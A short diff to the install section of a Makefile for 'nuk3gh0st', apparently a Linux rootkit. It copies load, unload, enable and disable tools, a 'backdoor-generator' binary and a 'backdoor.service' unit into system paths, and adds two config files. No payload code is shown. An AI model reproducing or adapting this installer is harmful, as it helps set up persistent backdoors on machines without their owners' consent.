@@ -17,8 +17,10 @@ install:
 	-cp disable-nuk3gh0st /usr/bin/disable-nuk3gh0st
 	-cp nuk3gh0st.startup /usr/share/nuk3gh0st/nuk3gh0st.startup
 	-cp nuk3gh0st.service /usr/share/nuk3gh0st/nuk3gh0st.service
+	-cp nuk3gh0st.conf /usr/share/nuk3gh0st/nuk3gh0st.conf
 	-cp backdoor-generator /usr/bin/backdoor-generator
 	-cp backdoor.service /usr/share/nuk3gh0st/backdoor.service
+	-cp backdoor.conf /usr/share/nuk3gh0st/backdoor.conf
 	chmod +x /usr/bin/load-nuk3gh0st
 	chmod +x /usr/bin/unload-nuk3gh0st
 	chmod +x /usr/bin/enable-nuk3gh0st
